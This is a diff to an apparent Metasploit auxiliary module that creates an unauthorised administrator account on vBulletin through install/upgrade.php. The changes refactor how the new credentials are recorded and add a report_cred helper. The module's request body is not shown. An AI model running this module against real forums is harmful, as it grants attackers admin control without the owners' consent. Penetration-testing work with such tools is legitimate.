@@ -49,14 +49,41 @@ class Metasploit3 < Msf::Auxiliary
     datastore["PASSWORD"]
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+
   def run
 
     if user == pass
-      print_error("#{peer} - Please select a password different than the username")
+      print_error("Please select a password different than the username")
       return
     end
 
-    print_status("#{peer} - Trying a new admin vBulletin account...")
+    print_status("Trying a new admin vBulletin account...")
 
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, "install", "upgrade.php"),
@@ -83,18 +110,17 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body =~ /Administrator account created/
-      print_good("#{peer} - Admin account with credentials #{user}:#{pass} successfully created")
-      report_auth_info(
-        :host => rhost,
-        :port => rport,
-        :sname => 'http',
-        :user => user,
-        :pass => pass,
-        :active => true,
-        :proof  => res.body
+      print_good("Admin account with credentials #{user}:#{pass} successfully created")
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: 'http',
+        user: user,
+        password: pass,
+        proof: res.body
       )
     else
-      print_error("#{peer} - Admin account creation failed")
+      print_error("Admin account creation failed")
     end
   end
 end
